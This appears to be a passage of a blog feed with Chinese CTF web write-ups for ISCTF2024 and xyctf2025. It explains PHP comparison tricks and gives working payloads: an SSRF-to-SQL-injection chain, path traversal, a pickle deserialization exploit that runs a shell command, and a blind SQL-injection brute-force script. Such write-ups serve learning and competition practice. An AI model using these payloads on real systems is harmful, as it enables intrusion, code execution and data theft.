class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;isctf2024&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span> == <span class="hljs-number">2024</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;QAQ&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>) == <span class="hljs-number">2024</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$which</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>];<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$which</span>)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;QAQ&#x27;</span>);<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$which</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">echo</span> GWF_HTML::<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;PHP-0817&#x27;</span>, <span class="hljs-string">&#x27;Hacker NoNoNo!&#x27;</span>, <span class="hljs-literal">false</span>);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>parse_str()：php中的一个函数，作用为将查询的字符串解析到变量中</p><p>@parse_str($b)：这个函数不会检测变量$b是否存在，如果通过其他方式传入数据给变量$b,且当前$b中数据存在，会将其直接覆盖</p><blockquote><p>b&#x3D;a[0]&#x3D;<em>240610708</em></p></blockquote><p>num不能等于2024，但num转化为整数后等于2024且num中不能含有字母</p><blockquote><p>num&#x3D;2024.1</p></blockquote><p>第一个case没有加break，字符串flag与0匹配（<strong>在php中，对于纯数字类型的switch在遇到字符或字符串时会强制int转换</strong>，本题转换为0），继续向下执行，到case3输出flag</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/mx.png"></p><h2 id="小蓝鲨的临时存储室"><a href="#小蓝鲨的临时存储室" class="headerlink" title="小蓝鲨的临时存储室"></a>小蓝鲨的临时存储室</h2><h2 id="小蓝鲨的书店"><a href="#小蓝鲨的书店" class="headerlink" title="小蓝鲨的书店"></a>小蓝鲨的书店</h2><h2 id="小蓝鲨的故事"><a href="#小蓝鲨的故事" class="headerlink" title="小蓝鲨的故事"></a>小蓝鲨的故事</h2><h2 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a>小蓝鲨的秘密</h2><p>bp直接抓包</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/mimi.png"></p><h2 id="蓝鲨的java入门课堂"><a href="#蓝鲨的java入门课堂" class="headerlink" title="蓝鲨的java入门课堂"></a>蓝鲨的java入门课堂</h2><p>参考博客：</p><p><a href="https://blog.csdn.net/2301_79700060/article/details/143854365">https://blog.csdn.net/2301_79700060/article/details/143854365</a></p><p><a href="https://www.zijie.fun/2024/11/11/ISCTF2024/">https://www.zijie.fun/2024/11/11/ISCTF2024/</a></p><p><a href="https://yxing-1.github.io/2025/02/03/ISCTF2024%E5%A4%8D%E7%8E%B0/">https://yxing-1.github.io/2025/02/03/ISCTF2024%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://tremse.github.io/2024/11/18/wpforisctf2024/#wp-for-isctf2024">https://tremse.github.io/2024/11/18/wpforisctf2024/#wp-for-isctf2024</a></p><p><a href="https://nanian-233.github.io/posts/ISCTF2024.html">https://nanian-233.github.io/posts/ISCTF2024.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xyctf2025_web复现</title>
    <link href="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> json<br><br>app = flask.Flask(__name__)<br>blacklist = string.ascii_letters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_string</span>(<span class="hljs-params">binary_string</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(binary_string) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Binary string length must be a multiple of 8&quot;</span>)<br>    binary_chunks = [binary_string[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_string), <span class="hljs-number">8</span>)]<br>    string_output = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(chunk, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> binary_chunks)<br>    <br>    <span class="hljs-keyword">return</span> string_output<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nolettersproxy</span>():<br>    url = flask.request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;No URL provided&#x27;</span>)<br>    <br>    target_url = <span class="hljs-string">&quot;http://lamentxu.top&quot;</span> + url<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> url:<br>            <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;No ssrf allowed&#x27;</span>)<br>    response = requests.get(target_url)<br><br>    <span class="hljs-keyword">return</span> flask.Response(response.content, response.status_code)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_search</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> conn:<br>        cur = conn.cursor()<br>        cur.execute(<span class="hljs-string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="hljs-subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)<br>        found = cur.fetchone()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> found <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> found[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-built_in">print</span>(flask.request.remote_addr)<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/1337&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api_search</span>():<br>    <span class="hljs-keyword">if</span> flask.request.remote_addr == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        code = flask.request.args.get(<span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-keyword">if</span> code == <span class="hljs-string">&#x27;abcdefghi&#x27;</span>:<br>            req = flask.request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                req = binary_to_string(req)<br>                <span class="hljs-built_in">print</span>(req)<br>                req = json.loads(req) <span class="hljs-comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span><br>            <span class="hljs-keyword">except</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Invalid JSON&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Empty Person&#x27;s name&quot;</span>)<br><br>            name = req[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">6</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Too long&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO &#x27;&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;)&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO )&quot;</span>)<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            Some waf hidden here ;)</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br><br>            fate = db_search(name)<br>            <span class="hljs-keyword">if</span> fate <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flask.abort(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;No such Person&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;Fate&#x27;</span>: fate&#125;<br>        <span class="hljs-keyword">else</span>:<br>            flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Hello local, and hello hacker&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Only local access allowed&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>关键路由</strong></p><p>1、&#x2F;proxy：获取用户请求中的url参数，将其拼接到<a href="http://lamentxu.top/">http://lamentxu.top</a> 后面，检查后通过requests.get发出请求，并返回响应内容（打ssrf）</p><p>2、&#x2F;1337：接受本地请求，简单检查后执行数据库查询操作（打sql注入）</p><p><strong>先是ssrf</strong></p><p>源码在目标url前加了一个域名lamentxu.top，加一个@跳到自定义的url</p><p>禁用了所有字母和“.”，可以用十进制表示IPV4地址（点分十进制：127.0.0.1，二进制：0111 1111 0000 0000 0000 0000 0000 0001，十进制：2130706433），或者用0绕过（linux中访问0会解析为127.0.0.1）</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337</p></blockquote><p><strong>然后绕过&#x2F;1337路由下的检查</strong></p><p>首先传入的参数0需要等于“abcdefghi”，但是代理网页禁用了所有字母，可以用二次url编码绕过</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337?0&#x3D;%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39</p></blockquote><p>然后去构造参数1，参数1会经过一个binary_to_string()函数，将二进制转为一个字符串，这里按照binary_to_string()去写一个stirng_to_binary()函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_binary</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;将可读文本转换为二进制字符串&#x27;&#x27;&#x27;</span><br>    binary_list = [<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(c), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> text]<br>    binary_string = <span class="hljs-string">&#x27;&#x27;</span>.join(binary_list)<br>    <span class="hljs-keyword">return</span> binary_string<br></code></pre></td></tr></table></figure><p>接下来进行长度绕过，<strong>len()函数对字符串会统计其字符的个数，而对元组、列表和字典只会统计其元素的个数</strong>，这里限制了元组和列表，使用字典绕过</p><p><strong>最后打sql注入</strong></p><p>init_db.py中有提示，可以直接查···WHERE NAME &#x3D; ‘LAMENTXU’</p><p>先用)))))))去闭合前面的upper()函数，再union进行联合注入</p><p>构造的json</p><blockquote><p>original_text &#x3D; ‘’’{“name”: {“‘))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME&#x3D;’LAMENTXU’ –”: 1}}’’’</p></blockquote><p>利用string_to_binary()转成二进制，最终payload</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337?0&#x3D;%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%261&#x3D;0111101100100010011011100110000101101101011001010010001000111010001000000111101100100010001001110010100100101001001010010010100100101001001010010010100100100000010101010100111001001001010011110100111000100000010100110100010101001100010001010100001101010100001000000100011001000001010101000100010100100000010001100101001001001111010011010010000001000110010000010101010001000101010101000100000101000010010011000100010100100000010101110100100001000101010100100100010100100000010011100100000101001101010001010011110100100111010011000100000101001101010001010100111001010100010110000101010100100111001000000010110100101101001000100011101000100000001100010111110101111101</p></blockquote><p>bp打</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/fate.png"></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   main.py</span><br><span class="hljs-string">@Time    :   2025/03/28 22:20:49</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag_&#123;uuid4&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request, response, redirect, static_file, run, route<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../../secret.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    secret = f.read()<br><br>app = Bottle()<br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    name = request.query.filename<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../../&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;../&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        response.status = <span class="hljs-number">403</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret_page</span>():<br>    <span class="hljs-keyword">try</span>:<br>        session = request.get_cookie(<span class="hljs-string">&quot;name&quot;</span>, secret=secret)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;guest&quot;</span>:<br>            session = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;<br>            response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, secret=secret)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden!&#x27;</span><br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The secret has been deleted!&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error!&quot;</span><br>run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p><strong>关键路由</strong></p><p>1、&#x2F;download：可以读取任意文件，但限制了目录穿越</p><p>2、&#x2F;secret：进行用户验证（调用了get_cookie()，get_cookie()中有一段代码是将base64解码后进行反序列化，拿到secret即可进行反序列化）</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/Signin1.png"></p><p><strong>先拿secret</strong></p><p>通过.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txt，绕过限制进行目录穿越拿secret</p><blockquote><p>payload：download&#x2F;filename&#x3D;.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txt</p><p>secret：Hell0_H@cker_Y0u_A3r_Sm@r7</p></blockquote><p><strong>打pickle反序列化</strong></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> cookie_encode<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20154/secret&quot;</span><br>secret = <span class="hljs-string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./flag.txt&#x27;)&quot;</span>,))<br><br>name = cookie_encode(<br>    (<span class="hljs-string">&#x27;session&#x27;</span>, &#123;<span class="hljs-string">&quot;name&quot;</span>: [Test()]&#125;),<br>    secret<br>)<br><br><span class="hljs-comment">#print(name.decode())</span><br><br>requests.get(url, cookies=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: name.decode()&#125;)<br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/Signin2.png"></p><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>禁用了鼠标和键盘，更多工具中打开开发者工具，发现有反调试，右键选择“向忽略列表添加脚本”，虽然无法调试但并没有什么影响</p><p>题目说要是能在2秒内解决这个puzzl，就给flag，与时间有关，在源码中检索关键词time，发现startTime和endTime，估计flag的弹窗条件为endTime-startTime &lt; 2，通过控制台赋一个较大值给startTime，如startTime &#x3D; 10000000000</p><p>然后完成拼图即可</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/puzzl1.png"></p><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>提示有sql注入，通过尝试确定username为注入点</p><p>尝试用万能密码’or(1&#x3D;1)#</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/ezsql1.png"></p><p>还有一层需要输入密钥，利用布尔盲注</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20185/login.php&quot;</span><br>secret = <span class="hljs-string">&quot;&quot;</span><br>char_set = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> char_set:<br>        <br>        <span class="hljs-comment">#爆库名</span><br>        <span class="hljs-comment">#payload =  f&quot;&#x27;or\tsubstr(database()from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><br>        <span class="hljs-comment">#爆表名</span><br>        <span class="hljs-comment">#payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=&#x27;testdb&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#)&quot;</span><br><br>        <span class="hljs-comment">#爆列名</span><br>        <span class="hljs-comment">#payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(column_name)from\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><br>        <span class="hljs-comment">#爆字段</span><br>        payload = <span class="hljs-string">f&quot;&#x27;or\tsubstr((select\tgroup_concat(secret)from\tdouble_check)from(<span class="hljs-subst">&#123;i&#125;</span>)for(1))=&#x27;<span class="hljs-subst">&#123;j&#125;</span>&#x27;#&quot;</span><br><br>        data = &#123;<span class="hljs-string">&quot;username&quot;</span>: payload, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span>&#125;<br><br>        res = requests.post(url=url, data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;目前由于系统恶意登录尝试请求过多,现已开启双重认证机制,请输入管理员账户的秘钥&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            secret += j<br>            <span 